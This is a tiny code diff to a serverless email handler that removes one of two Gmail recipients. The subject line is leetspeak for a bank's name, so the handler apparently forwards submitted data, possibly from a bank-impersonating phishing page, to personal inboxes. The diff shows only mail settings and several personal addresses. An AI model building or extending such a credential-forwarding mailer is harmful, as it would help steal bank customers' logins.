@@ -13,7 +13,7 @@ exports.handler = async function(event, context) {
 
     let mailOptions = {
         from: 'jazzysell123@gmail.com',
-        to: 'sierroalee@gmail.com, fendergriseldo@gmail.com',
+        to: 'sierroalee@gmail.com',
         subject: 'B4NR3S3RV4S v.1',  // puedes cambiar el asunto si quieres
         text: message,
     };
